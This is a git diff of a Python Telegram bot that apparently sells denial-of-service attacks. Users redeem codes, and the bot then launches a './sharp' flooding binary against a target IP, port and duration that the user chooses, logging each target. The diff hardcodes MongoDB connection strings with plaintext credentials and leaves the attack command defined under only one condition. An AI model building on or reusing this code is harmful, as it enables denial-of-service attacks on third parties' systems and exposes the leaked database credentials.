@@ -12,9 +12,9 @@ from pymongo import MongoClient
 from datetime import datetime, timedelta, timezone
 
 # Database Configuration
-MONGO_URI = 'mongodb+srv://Magic:sharp@cluster0.fa68l.mongodb.net/'
+MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
 client = MongoClient(MONGO_URI)
-db = client['TEST']
+db = client['sharp']
 users_collection = db['users']
 settings_collection = db['settings-V9']  # A new collection to store global settings
 redeem_codes_collection = db['redeem_codes']
@@ -446,8 +446,9 @@ async def attack(update: Update, context: CallbackContext):
     byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
     threads = threads["value"] if threads else DEFAULT_THREADS
 
-    # Use only the default attack command
-    attack_command = f"./sharp {ip} {port} {duration} 877"
+    # Determine the attack command based on the argument type
+    if argument_type == 3:
+        attack_command = f"./sharp {ip} {port} {duration} 877"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
@@ -470,21 +471,6 @@ async def attack(update: Update, context: CallbackContext):
     user_attack_history[user_id].add((ip, port))
 
 # Command to view the attack history of a user
-async def attack_history(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user
-
-    # Check if the user has an attack history
-    if user_id not in user_attack_history or not user_attack_history[user_id]:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No attack history found.*", parse_mode='Markdown')
-        return
-
-    attack_history_message = "*📜 Attack History:*\n"
-    for ip, port in user_attack_history[user_id]:
-        attack_history_message += f"*🔹 Target: {ip}:{port}*\n"
-
-    await context.bot.send_message(chat_id=chat_id, text=attack_history_message, parse_mode='Markdown')
-
 async def view_attack_log(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
